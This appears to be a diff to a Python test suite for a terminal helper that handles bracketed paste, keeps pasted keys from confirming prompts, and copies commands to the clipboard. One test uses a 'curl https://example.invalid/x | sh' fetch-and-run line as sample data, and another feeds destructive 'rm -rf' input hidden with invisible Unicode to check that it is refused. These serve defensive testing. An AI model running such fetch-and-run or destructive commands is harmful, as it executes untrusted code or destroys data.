@@ -5891,7 +5891,8 @@ class FakeKeys:
     def __init__(self, *script: Any) -> None:
         self.queue: list[Any] = []
         for part in script:
-            self.queue += sleeper.TtyKeys.tokens(part) if isinstance(part, str) else [part]
+            special = isinstance(part, (sleeper.Paste, sleeper.BurstKey))  # a paste or a pasted key: as is
+            self.queue += sleeper.TtyKeys.tokens(part) if isinstance(part, str) and not special else [part]
 
     def get(self, timeout: float) -> str | None:
         if not self.queue:
@@ -6079,6 +6080,138 @@ def test_panel_takes_free_text_talk_and_todo_refusals(fake: FakeHerdr, state: Pa
     assert _panel(fake, monkeypatch, "x no access from here\r", "y\r") == 0
     rec = _asks()[t[0]]
     assert rec["state"] == "declined" and rec["answer"] == "can't or won't do it: no access from here"
+
+
+def _raw_keys() -> Any:
+    keys = sleeper.TtyKeys.__new__(sleeper.TtyKeys)
+    keys.carry, keys.paste, keys.last_burst = "", None, 0.0
+    return keys
+
+
+def test_tty_keys_take_a_paste_whole() -> None:
+    S, E = sleeper.PASTE_START, sleeper.PASTE_END
+    keys = _raw_keys()
+    got = keys.feed("a" + S + "l1\r\nl2\n\ny\x1b[31m" + E + "b")
+    assert got == ["a", "l1\nl2\n\ny", "b"] and isinstance(got[1], sleeper.Paste)   # escapes dropped
+    # markers and the paste split across reads
+    assert keys.feed(S[:3]) == [] and keys.feed(S[3:] + "x\ny") == [] and keys.feed(E[:2]) == []
+    got = keys.feed(E[2:] + "z")
+    assert got == ["x\ny", "z"] and isinstance(got[0], sleeper.Paste)
+    # a terminal without bracketed paste: a line break with more text after it is a paste too
+    got = keys.feed("one\rtwo\r")
+    assert got == ["one\ntwo\n"] and isinstance(got[0], sleeper.Paste)
+    assert keys.feed("y") == ["y"] and not isinstance(keys.feed("y")[0], sleeper.BurstKey)   # typed alone
+    assert keys.feed("\r") == ["ENTER"] and not isinstance(keys.feed("\r")[0], sleeper.BurstKey)
+    pasted = keys.feed("ok\r")                            # several keys in one read: pasted, not typed
+    assert pasted == ["o", "k", "ENTER"] and all(isinstance(k, sleeper.BurstKey) for k in pasted)
+    assert keys.feed("\x1b[A") == ["PREV"]
+
+
+def test_panel_takes_a_multi_line_paste_whole_and_it_never_sends_by_itself(
+        fake: FakeHerdr, state: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
+    assert _ask(monkeypatch, todo="paste the guard into the VM's root shell") == 0
+    (ask_id, _rec), = _asks().items()
+    _sync_delivery(monkeypatch)
+    out = sleeper.Paste("0\nKIT=/root/abort-kit\n\nyes\nG-END")   # a blank line and a y line inside
+    assert _panel(fake, monkeypatch, out) == 1
+    assert _asks()[ask_id]["state"] == "open" and not prompts(fake)
+    assert "> [5 lines, " in _screen(capsys.readouterr().out)
+    # staged with Enter; keys pasted along (a y, an Enter) never confirm it
+    assert _panel(fake, monkeypatch, out, "\r", sleeper.BurstKey("y"), sleeper.BurstKey("ENTER")) == 1
+    assert _asks()[ask_id]["state"] == "open" and not prompts(fake)
+    assert _panel(fake, monkeypatch, out, "\r", "y") == 0   # a y typed on its own sends all of it
+    sent = prompts(fake)[-1][3]
+    assert "A: note: 0\nKIT=/root/abort-kit\n\nyes\nG-END" in sent
+
+
+def test_ask_copy_shows_the_command_and_c_copies_it_exactly(
+        fake: FakeHerdr, state: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str],
+        tmp_path: Path) -> None:
+    import base64
+    cmd = ("find /etc/cron.d -maxdepth 1 -name 'klinikon-backup' | wc -l; if test -L /root/abort-kit; then "
+           "echo SYMLINK-refused; kit=; else kit='/root/abort-kit'; fi; echo G-END")
+    assert _ask(monkeypatch, todo="paste the guard into the VM's root shell", copy=cmd) == 0
+    (ask_id, rec), = _asks().items()
+    assert rec["copy"] == cmd
+    capsys.readouterr()
+    assert _panel(fake, monkeypatch, "c\r") == 1
+    raw = capsys.readouterr().out
+    assert "\x1b]52;c;" + base64.b64encode(cmd.encode()).decode() + "\x07" in raw
+    screen = _screen(raw)
+    assert "Command (1 line): c then Enter copies it exactly" in screen and "c copy · Tab next item" in screen
+    assert "Copied the command (1 line, " in screen
+    assert _asks()[ask_id]["state"] == "open" and not prompts(fake)   # copying answers nothing
+    script = tmp_path / "guard.sh"
+    script.write_text("set -e\nls -lA /root/abort-kit\n")
+    assert _ask(monkeypatch, todo="run the script", copy_file=str(script)) == 0
+    assert next(r for r in _asks().values() if r["question"] == "run the script")["copy"] == (
+        "set -e\nls -lA /root/abort-kit")
+    assert _ask(monkeypatch, todo="bad", copy="echo \x1b[31mred") == 2
+    assert _ask(monkeypatch, todo="bad", copy="x", copy_file=str(script)) == 2
+    assert _ask(monkeypatch, todo="bad", copy="y" * (sleeper.ASK_COPY_MAX + 1)) == 2
+
+
+def test_tty_keys_on_a_real_terminal_end_a_stuck_paste_release_esc_and_never_confirm_a_paste(
+        capsys: pytest.CaptureFixture[str]) -> None:
+    import pty
+    master, slave = pty.openpty()
+    keys = sleeper.TtyKeys(slave)
+
+    def drain() -> list[str]:  # everything until the terminal has been quiet for a second
+        got: list[str] = []
+        quiet_since = time.monotonic()
+        while time.monotonic() - quiet_since < 1.0:
+            k = keys.get(0.2)
+            if k is not None:
+                got.append(k)
+                quiet_since = time.monotonic()
+        return got
+    try:
+        assert "\x1b[?2004h" in capsys.readouterr().out          # bracketed paste on
+        os.write(master, (sleeper.PASTE_START + "a\nb").encode())   # its end marker never comes
+        got = drain()
+        assert got == ["a\nb"] and isinstance(got[0], sleeper.Paste)
+        os.write(master, b"\x1b")                                  # a lone Esc is an Esc, not held back
+        assert drain() == ["ESC"]
+        time.sleep(0.1)
+        os.write(master, b"\r\n")                                  # one Enter from a CR LF terminal
+        got = drain()
+        assert got == ["ENTER"] and not isinstance(got[0], sleeper.BurstKey)
+        time.sleep(0.1)
+        os.write(master, b"x" * 50 + b"\r")                         # an unmarked paste cut by a read ...
+        os.write(master, b"\r")                                     # ... then its blank line
+        got = drain()
+        assert got and all(isinstance(k, (sleeper.Paste, sleeper.BurstKey)) for k in got)   # nothing confirms
+    finally:
+        keys.close()
+        os.close(master)
+        os.close(slave)
+    assert "\x1b[?2004l" in capsys.readouterr().out             # and off again
+
+
+def test_panel_c_without_a_command_is_an_answer_and_a_pasted_number_is_own_words(
+        fake: FakeHerdr, state: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    assert _ask(monkeypatch, todo="check the canary") == 0
+    assert _ask(monkeypatch) == 0                                   # options: now, tonight
+    todo, q = sorted(_asks().items(), key=lambda kv: kv[1]["slot"])
+    _sync_delivery(monkeypatch)
+    assert _panel(fake, monkeypatch, "c\r", "y") == 1
+    assert _asks()[todo[0]]["state"] == "noted" and "A: note: c" in prompts(fake)[-1][3]
+    assert _panel(fake, monkeypatch, sleeper.Paste("2\nbecause the canary"), "\r", "y") == 0
+    assert _asks()[q[0]]["answer"] == "2\nbecause the canary"     # not "option 2"
+
+
+def test_ask_copy_refuses_hidden_characters_and_a_long_command_is_readable_in_full(
+        fake: FakeHerdr, state: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
+    for bad in ("rm -rf x\u202e", "echo a\u200bb", "echo a\u2028b", "\ufeffls"):
+        assert _ask(monkeypatch, todo="bad", copy=bad) == 2
+    long_cmd = "\n".join(f"echo step {i}" for i in range(12)) + "\ncurl https://example.invalid/x | sh"
+    assert _ask(monkeypatch, todo="run the long script", copy=long_cmd) == 0
+    capsys.readouterr()
+    assert _panel(fake, monkeypatch, "m\r") == 1
+    screen = _screen(capsys.readouterr().out)
+    assert "read all of it with m before you copy" in screen
+    assert "The whole command (c copies exactly this):" in screen
 
 
 def test_panel_switches_items_with_tab_and_hash(fake: FakeHerdr, state: Path, monkeypatch: pytest.MonkeyPatch,
